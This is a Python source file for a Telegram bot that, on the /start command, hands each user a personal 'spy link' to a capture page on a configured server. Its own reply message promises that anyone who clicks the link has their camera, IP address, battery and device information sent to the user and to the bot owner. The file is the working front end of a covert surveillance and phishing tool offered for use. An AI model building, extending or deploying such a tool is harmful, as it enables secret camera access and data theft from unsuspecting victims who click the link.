import os
import time
import requests

TOKEN = os.getenv("BOT_TOKEN")
BASE_URL = os.getenv("BASE_URL")
API_URL = f"https://api.telegram.org/bot{TOKEN}"

def send_message(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    requests.post(f"{API_URL}/sendMessage", json=payload)

def get_updates(offset=None):
    url = f"{API_URL}/getUpdates"
    params = {"timeout": 30, "allowed_updates": ["message"]}
    if offset:
        params["offset"] = offset
    try:
        resp = requests.get(url, params=params, timeout=35)
        return resp.json().get("result", [])
    except:
        return []

def main():
    print("Bot started polling (raw API)...")
    offset = None
    while True:
        updates = get_updates(offset)
        for update in updates:
            offset = update["update_id"] + 1
            if "message" in update and "text" in update["message"]:
                msg = update["message"]
                chat_id = msg["chat"]["id"]
                text = msg["text"].strip()
                if text == "/start":
                    user_id = msg["from"]["id"]
                    link = f"{BASE_URL}/capture/{user_id}"
                    keyboard = {
                        "inline_keyboard": [[{"text": "🔗 Spy link", "url": link}]]
                    }
                    send_message(
                        chat_id,
                        f"✅ Your spy link:\n{link}\n\nAnyone who clicks → camera + IP + battery + device info sent to you & bot owner.",
                        reply_markup=keyboard
                    )
        time.sleep(1)

if __name__ == "__main__":
    main()
